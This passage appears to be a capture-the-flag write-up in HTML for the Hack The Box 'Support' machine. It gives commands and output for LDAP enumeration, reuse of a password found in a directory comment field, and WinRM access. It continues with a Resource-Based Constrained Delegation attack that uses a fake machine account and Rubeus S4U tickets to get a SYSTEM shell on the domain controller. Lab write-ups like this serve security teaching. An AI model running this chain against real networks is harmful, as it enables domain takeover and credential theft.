+INFO: Connecting to LDAP server: dc.support.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Found 21 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Done in 00M 13S</code></pre>
+
+                <p>The parameters used are:</p>
+                <ul>
+                    <li><code>-c ALL</code>: Collects all available information (users, groups, computers, permissions, GPOs, etc.)</li>
+                    <li><code>-d</code>: Specifies the target domain</li>
+                    <li><code>-ns</code>: Defines the nameserver to use</li>
+                </ul>
+
+                <p>BloodHound generates 7 JSON files with detailed information: computers, containers, domains, gpos, groups, ous, and users.</p>
+
+                <h2>Domain Dump with ldapdomaindump</h2>
+                <p>I complement the enumeration with <code>ldapdomaindump</code> to obtain a complete directory dump in a more readable format:</p>
+                <pre><code class="language-bash">ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap</code></pre>
+
+                <p>Among the numerous dumped data, a user with sensitive information in the <code>info</code> field stands out:</p>
+                <pre><code class="language-json">"info": [
+    "Ironside47pleasure40Watchful"
+]</code></pre>
+
+                <p>This value appears to be a password. Given the common practice of administrators storing temporary credentials in comment fields, this warrants investigation.</p>
+
+                <h2>BloodHound Analysis - Critical Permission Identification</h2>
+                <p>I launch the BloodHound GUI and import the collected JSON files. I use a custom Cypher query to analyze the <code>support</code> user's relationships:</p>
+                <pre><code class="language-cypher">MATCH p=(u:User {name:"SUPPORT@SUPPORT.HTB"})-[r*1..2]->(n)
+RETURN p</code></pre>
+
+                <p>The resulting graph reveals critical information:</p>
+                <p><img src="./media/image3.png" alt="BloodHound graph showing that the SUPPORT user has GenericAll permissions over the Domain Controller" /></p>
+
+                <p>The <code>support</code> user has the <code>GenericAll</code> permission over the Domain Controller object, which grants full control over that object and enables multiple privilege escalation vectors.</p>
+
+                <h2>Initial Access - WinRM as User support</h2>
+                <p>Before exploiting the advanced permissions, I verify if the <code>support</code> user with the found password (<code>Ironside47pleasure40Watchful</code>) has remote access to the system:</p>
+                <pre><code class="language-bash">netexec winrm support.htb -u support -p 'Ironside47pleasure40Watchful'</code></pre>
+
+                <p>The response confirms that the user has WinRM privileges with the <code>Pwn3d!</code> indicator:</p>
+                <pre><code class="language-plaintext">WINRM  10.10.11.174  5985  DC  [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
+WINRM  10.10.11.174  5985  DC  [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)</code></pre>
+
+                <p>I connect to the system using Evil-WinRM:</p>
+                <pre><code class="language-bash">evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'</code></pre>
+
+                <p>I obtain a successful remote PowerShell session:</p>
+                <pre><code class="language-plaintext">Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\support\Documents></code></pre>
+
+                <p>I navigate to the user's desktop and retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - GenericAll Abuse</h2>
+                <p>I review the BloodHound results again to plan privilege escalation. The <code>GenericAll</code> permission over the DC is especially powerful:</p>
+                <p><img src="./media/image1.png" alt="Detailed BloodHound view showing the SUPPORT user's GenericAll permission over DC" /></p>
+
+                <p>The <code>GenericAll</code> permission allows modifying virtually any attribute of the DC object, including the <code>msds-allowedtoactonbehalfofotheridentity</code> attribute, which is the basis for the Resource-Based Constrained Delegation (RBCD) attack.</p>
+
+                <h3>Tool Preparation</h3>
+                <p>To perform the RBCD attack, I need several PowerShell tools and a .NET executable. I upload the following files to the victim machine:</p>
+                <ul>
+                    <li><strong>PowerView.ps1</strong>: AD reconnaissance framework (<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">link</a>)</li>
+                    <li><strong>Powermad.ps1</strong>: Tool for creating machine accounts (<a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">link</a>)</li>
+                    <li><strong>Rubeus.exe</strong>: C# Kerberos tool (<a href="https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_x64">precompiled binary</a>)</li>
+                </ul>
+
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> upload PowerMad.ps1
+*Evil-WinRM* PS C:\Users\support\Desktop> upload PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Desktop> upload Rubeus.exe</code></pre>
+
+                <p>I load the scripts into memory to use their functions:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Desktop> . .\Powermad.ps1</code></pre>
+
+                <h3>Machine Account Quota Verification</h3>
+                <p>I check the value of the <code>ms-ds-machineaccountquota</code> attribute, which determines how many machine accounts a domain user can create:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota</code></pre>
+
+                <p>The value is 10, which is the default configured in Active Directory:</p>
+                <pre><code class="language-plaintext">ms-ds-machineaccountquota
+-------------------------
+                       10</code></pre>
+
+                <p>This means I can create up to 10 machine accounts in the domain without needing special privileges.</p>
+
+                <h3>Creating a Fake Machine Account</h3>
+                <p>I use Powermad to create a new machine account with the password <code>asd</code>:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> New-MachineAccount -MachineAccount asd -Password $(ConvertTo-SecureString 'asd' -AsPlainText -Force)</code></pre>
+
+                <p>The account is successfully created:</p>
+                <pre><code class="language-plaintext">[+] Machine account asd added</code></pre>
+
+                <h3>Obtaining the New Machine's SID</h3>
+                <p>I need the SID (Security Identifier) of the newly created machine to configure the delegation:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> $fakesid = Get-DomainComputer asd | select -expand objectsid
+*Evil-WinRM* PS C:\Users\support\Desktop> $fakesid</code></pre>
+
+                <p>The assigned SID is:</p>
+                <pre><code class="language-plaintext">S-1-5-21-1677581083-3380853377-188903654-5602</code></pre>
+
+                <h3>Configuring Resource-Based Constrained Delegation</h3>
+                <p>The next step is to modify the DC's <code>msds-allowedtoactonbehalfofotheridentity</code> attribute to trust our fake machine. This is done by creating a Security Descriptor that grants full permissions to our machine:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
+*Evil-WinRM* PS C:\Users\support\Desktop> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+*Evil-WinRM* PS C:\Users\support\Desktop> $SD.GetBinaryForm($SDBytes, 0)
+*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code></pre>
+
+                <p>This configuration allows our fake machine to act on behalf of other users when connecting to the DC.</p>
+
+                <h3>Verification with BloodHound</h3>
+                <p>To confirm that the configuration was applied correctly, I run the BloodHound collector again and analyze the new graph:</p>
+                <p><img src="./media/image2.png" alt="Updated BloodHound graph showing that the fake machine ASD can act on behalf of DC via AllowedToAct" /></p>
+
+                <p>The graph confirms that the <code>AllowedToAct</code> relationship was correctly established between our fake machine and the DC.</p>
+
+                <h3>Generating RC4 Hash for the Machine Account</h3>
+                <p>To request Kerberos tickets on behalf of our fake machine, I need the NTLM hash of its password. I use Rubeus to calculate the hash:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe hash /password:asd /user:asd /domain:support.htb</code></pre>
+
+                <p>Rubeus generates several types of hashes:</p>
+                <pre><code class="language-plaintext">[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : asd
+[*] Input username             : asd
+[*] Input domain               : support.htb
+[*] Salt                       : SUPPORT.HTBasd
+[*]       rc4_hmac             : EF8D80B784540A0EC71A1FC853985619
+[*]       aes128_cts_hmac_sha1 : C25CC9853D0BDB97E48ADC22EE42F298
+[*]       aes256_cts_hmac_sha1 : 03583D8E1BD4215117451F3BF965334FFFACF385F7FBC5C7F1F593C7911C45ED
+[*]       des_cbc_md5          : 45BC13B9155DEFB6</code></pre>
+
+                <p>The RC4 (NTLM) hash I need is: <code>EF8D80B784540A0EC71A1FC853985619</code></p>
+
+                <h3>Requesting Service Ticket via S4U</h3>
+                <p>Now I use Rubeus to perform an S4U2Self and S4U2Proxy attack. This attack requests a service ticket (TGS) for the DC's CIFS service, impersonating the Administrator user:</p>
+                <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe s4u /user:asd /rc4:EF8D80B784540A0EC71A1FC853985619 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt</code></pre>
+
+                <p>The <code>/ptt</code> (Pass The Ticket) parameter would attempt to inject the ticket directly into the session, but since we're in a WinRM session, this approach won't work directly. Instead, Rubeus generates three tickets in Base64 format, with the last one being the final service ticket we need.</p>
+
+                <h3>Converting the Ticket to ccache Format</h3>
+                <p>To use the ticket from my Kali Linux attacking machine, I need to convert it from <code>.kirbi</code> format (Windows Kerberos) to <code>.ccache</code> format (used by Linux tools).</p>
+
+                <p>I copy the last Base64 ticket generated by Rubeus, save it to a file, and decode it:</p>
+                <pre><code class="language-bash">base64 -d ticket.kirbi.b64 > ticket.kirbi</code></pre>
+
+                <p>Then I use Impacket's <code>ticketConverter.py</code> to convert the format:</p>
+                <pre><code class="language-bash">python3 ticketConverter.py ticket.kirbi ticket.ccache</code></pre>
+
+                <p>The conversion completes successfully:</p>
+                <pre><code class="language-plaintext">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] converting kirbi to ccache...
+[+] done</code></pre>
+
+                <h3>Access as Administrator via psexec</h3>
+                <p>With the ticket in ccache format, I can use it to authenticate as Administrator. I set the <code>KRB5CCNAME</code> environment variable to point to my ticket and use <code>impacket-psexec</code>:</p>
+                <pre><code class="language-bash">KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass</code></pre>
+
+                <p>The parameters indicate:</p>
+                <ul>
+                    <li><code>-k</code>: Use Kerberos authentication</li>
+                    <li><code>-no-pass</code>: Don't prompt for password (use the ticket)</li>
+                </ul>
+
+                <p>Psexec successfully connects to the DC as Administrator:</p>
+                <pre><code class="language-plaintext">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file GhfjxMaI.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service rLGi on dc.support.htb.....
+[*] Starting service rLGi.....
+[!] Press help for extra shell commands
+
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></code></pre>
+
+                <p>I have a SYSTEM shell on the Domain Controller. I navigate to the Administrator's desktop and retrieve the root flag, completing the machine.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
